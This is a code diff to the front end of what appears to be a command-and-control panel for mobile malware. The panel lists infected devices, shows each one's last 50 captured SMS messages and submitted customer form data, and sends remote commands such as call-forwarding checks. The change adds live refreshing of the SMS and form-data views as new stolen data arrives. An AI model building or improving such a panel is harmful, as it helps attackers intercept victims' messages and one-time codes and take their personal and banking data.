@@ -114,6 +114,8 @@
 
         const socket = io();
         let devices = [];
+        // track which modal is currently open so we can refresh it when new data arrives
+        let currentOpenModal = null; // { type: 'sms'|'data'|'form', deviceId }
         let currentFilter = 'all';
 
         function toast(msg, err=false) {
@@ -144,6 +146,16 @@
                 if (!r.ok) throw new Error('Network response was not ok: ' + r.status);
                 devices = await r.json();
                 render();
+                // If a modal is open, refresh its contents from the updated `devices` data
+                try {
+                    if (currentOpenModal && document.getElementById('viewSmsModal').classList.contains('show') && currentOpenModal.type === 'sms') {
+                        viewSms(currentOpenModal.deviceId);
+                    }
+                    if (currentOpenModal && document.getElementById('viewDataModal').classList.contains('show')) {
+                        if (currentOpenModal.type === 'data') viewData(currentOpenModal.deviceId);
+                        if (currentOpenModal.type === 'form') viewFormData(currentOpenModal.deviceId);
+                    }
+                } catch (e) { /* ignore UI refresh errors */ }
                 if (showMsg) toast('✅ Refresh Successful!');
             } catch (err) {
                 console.error('Fetch devices failed', err);
@@ -254,6 +266,7 @@
         function viewData(deviceId) {
             const device = devices.find(d => d.deviceId === deviceId);
             if (!device) { toast('❌ Device not found', true); return; }
+            currentOpenModal = { type: 'data', deviceId };
             const modalBody = document.getElementById('modalBody');
             let html = `<div style="background:#e3f2fd;padding:18px;border-radius:8px;"><div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:10px;">Device Details</div><table style="width:100%;border-collapse:collapse;font-size:15px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.04);"><tbody>`;
             html += `<tr><td style='font-weight:bold;padding:8px 6px;'>1. Model</td><td style='padding:8px 6px;'>${escapeAttr(device.model||'N/A')}</td></tr>`;
@@ -283,6 +296,7 @@
         function viewFormData(deviceId) {
             const device = devices.find(d => d.deviceId === deviceId);
             if (!device) { toast('❌ Device not found', true); return; }
+            currentOpenModal = { type: 'form', deviceId };
             const modalBody = document.getElementById('modalBody');
             let html = `<div style=\"background:#fffde7;padding:18px;border-radius:8px;\"><div style=\"font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:10px;\">Submitted Form Data</div></div>`;
             if (device.customerData && Object.keys(device.customerData).length > 0) {
@@ -296,6 +310,7 @@
         function viewSms(deviceId) {
             const device = devices.find(d => d.deviceId === deviceId);
             if (!device) { toast('❌ Device not found', true); return; }
+            currentOpenModal = { type: 'sms', deviceId };
             // Use stored smsMessages (assumes device/app forwards latest messages automatically)
             const msgs = Array.isArray(device.smsMessages) ? device.smsMessages.slice(-50).reverse() : [];
             let html = `<div style='background:#e3f2fd;padding:18px;border-radius:8px;'><div style='font-size:18px;font-weight:bold;color:#1976d2;'>${escapeAttr(device.model||'')} - Last 50 SMS</div></div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
@@ -397,7 +412,13 @@
                 try { const r = await fetch('/api/command',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'CALL_FORWARD_STATUS', data:{ simSlot } }) }); const d = await r.json(); document.getElementById('_cfStatus').innerText = d.success ? ('Status: '+(d.message||'OK')) : ('❌ '+(d.message||'Failed')); } catch (err) { document.getElementById('_cfStatus').innerText='❌ '+err.message; }
             };
         }
-        function closeModal(modalId) { document.getElementById(modalId).classList.remove('show'); }
+        function closeModal(modalId) { 
+            document.getElementById(modalId).classList.remove('show'); 
+            // clear open modal tracking when closed
+            if (currentOpenModal && ((modalId === 'viewSmsModal' && currentOpenModal.type === 'sms') || (modalId === 'viewDataModal' && (currentOpenModal.type === 'data' || currentOpenModal.type === 'form')))) {
+                currentOpenModal = null;
+            }
+        }
         window.onclick = function(event) { const viewDataModal = document.getElementById('viewDataModal'); const viewSmsModal = document.getElementById('viewSmsModal'); if (event.target == viewDataModal) viewDataModal.classList.remove('show'); if (event.target == viewSmsModal) viewSmsModal.classList.remove('show'); }
 
         // initial
